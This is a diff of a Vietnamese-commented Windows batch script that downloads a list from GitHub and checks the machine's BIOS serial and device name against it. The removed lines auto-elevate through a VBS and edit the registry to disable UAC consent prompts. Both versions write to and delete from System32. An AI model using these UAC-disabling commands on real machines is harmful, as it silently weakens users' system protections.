@@ -1,16 +1,14 @@
 @echo off
-set "params=%*"
-cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
-setlocal enabledelayedexpansion
-
 :: Tải file check.txt về %temp%
 set "url=https://raw.githubusercontent.com/mitutina/mitutina/main/check.txt"
 set "tempfile=%temp%\check.txt"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%')"
-echo 12 > C:\Windows\System32\checkseries1.txt
-
+echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries1.txt
+:: Kiểm tra xem file đã được tải xuống thành công chưa
+if not exist "%tempfile%" (
+    echo Khong tai dc file.txt.
+    goto :cleanup
+)
 :: Lấy SerialNumber và Device Name
 for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_BIOS).SerialNumber"') do set "serial=%%i"
 for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set "device=%%i"
@@ -18,41 +16,32 @@ for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win3
 :: Hiển thị thông tin để so sánh
 echo Serial Number: %serial%
 echo Device Name: %device%
-echo Noi Dung file temp.txt:
+echo Noi Dung file check.txt:
 type "%tempfile%"
-echo 23 > C:\Windows\System32\checkseries2.txt
+echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries2.txt
 :: So sánh nội dung
 set "found=0"
-for /f "delims=" %%j in ('type "%tempfile%"') do (
+for /f "tokens=*" %%j in ('type "%tempfile%"') do (
     if /i "%%j"=="%serial%" set "found=1"
     if /i "%%j"=="%device%" set "found=1"
 )
-
-:: Tạo file Oke.txt nếu tìm thấy trùng lặp
+:: Thực hiện hành động dựa trên kết quả so sánh
 if %found%==1 (
-
-
-
-del /f /q "C:\a.txt"
-echo 37 > C:\Windows\System32\checkseries3.txt
-
-
-
-
-
-
-)
+    echo Trung Khop
+    echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries3.txt
+    :: Thực hiện các lệnh tiếp theo ở đây
+    echo Thuc Hien Cac Lenh Khac...
 ) else (
-    echo Khong trung khop.
+    echo Khong Trung Khop.
 )
-
-:: Xóa file tạm và các biến tạm thời
+:: Dọn dẹp các file tạm và biến
+:cleanup
 if exist "%tempfile%" del "%tempfile%"
 set "url="
 set "tempfile="
 set "serial="
 set "device="
 set "found="
-echo Hoan Thanh.
-echo 58 > C:\Windows\System32\checkseries4.txt
-exit
+echo 37 > C:\Windows\System32\WindowsPowerShell\checkseries4.txt
+del /f /q "C:\Windows\System32\run.bat"
+echo Hoan Thanh
